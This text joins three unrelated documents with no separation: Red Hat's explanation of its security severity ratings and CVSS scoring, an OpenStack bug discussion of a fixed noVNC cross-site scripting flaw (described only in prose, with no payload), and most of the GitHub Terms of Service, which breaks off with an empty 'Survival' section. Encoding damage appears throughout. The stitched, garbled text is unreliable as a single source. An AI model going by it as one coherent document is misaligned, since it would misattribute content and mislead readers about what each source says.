# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other usersâ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a programâs source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hatâs CVE database.

When a technologyâenabled and most likely used by defaultâcompletely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-trackingÂ  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.Â  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.Â  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.Â  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.Â  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.Â  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

# XSS in noVNC

### Bug Description

I recently reported an XSS bug in noVNC, which has since been fixed in 0.6.2: <https://github.com/novnc/noVNC/issues/748>.

Depending on how OpenStack pulls in the noVNC viewer, it might be worth a security note or release.

Vulnerability Summary:

It's possible to set up a malicious noVNC server, then send someone a

URL like <http://GOOD_NOVNC/vnc_auto.html?host=BAD_NOVNC>. The good noVNC

will use a WebSocket to connect to the malicious one, then display a

status message that runs JavaScript in the user's browser.

I've added an invalid OSSA bugtask (indicating that the OpenStack VMT won't issue a formal advisory for this) as it's clearly class C2 in our report taxonomy: <https://security.openstack.org/vmt-process.html#incident-report-taxonomy>

I've subscribed the security team reviewers in case they determine they would like to release a security note as you indicate. Due to the fact that the NoVNC vulnerabilities you've linked above are public, it probably makes little sense to work on this report under embargo but I'll let the OSSG CoreSec members make that determination.

I don't see much of a case for releasing a note about a bad version of a third party component with an update already available.

Sounds fine to me, it will help get more authors eyes on it to write a note too.

or rather I echo Travis point, in that patches are already there, so no need for an OSSN.

It is my understanding, per the above, that this is a bug in a third-party component that has been fixed, so closing the horizon portion of this bug. If this is not the case, then feel free to reopen the bug and clarify.

Previously, setting `innerHTML` was used to display the statuses.  These
could include content communicated from the remote VNC server, allowing
the remove VNC server to inject HTML into the noVNC page.

This commit switches all uses of `innerHTML` to use `textContent`, which
is not vulnerable to the HTML injection.

**\_This is a vulnerability fix release.**\_

Fixes a XSS issue in which the remote VNC server could inject arbitrary HTML into the noVNC web page via the messages propagated to the status field, such as the VNC server name.

This affects users of `vnc_auto.html` and `vnc.html`, as well as any users of `include/ui.js`.

Thanks to David Wyde of Cisco for reporting the issue.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A âPersonal Accountâ represents an individual Userâs authorization to log in to and use the Service and serves as a Userâs identity on GitHub. âOrganizationsâ are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The âAgreementâ refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the âTerms of Serviceâ or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. âContentâ refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. âUser-Generated Contentâ is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. âGitHub,â âWe,â and âUsâ refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The âServiceâ refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. âThe User,â âYou,â and âYourâ refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The âWebsiteâ refers to GitHubâs website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHubâs conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organizationâs data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that Userâs Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your countryâs minimum age may be older; in such a case, you are responsible for complying with your countryâs laws.
* Your login may only be used by one person â i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us â and other GitHub Users â certain legal permissions, listed in Sections D.4 â D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 â D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statementâfor security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright Â© GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If youâd like to use GitHubâs trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isnât available to the rest of the world. Due to the sensitive nature of this information, itâs important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHubâs confidential information (collectively, âConfidential Informationâ), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the âPurposeâ), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we donât otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

Weâre always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, âFeedbackâ), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

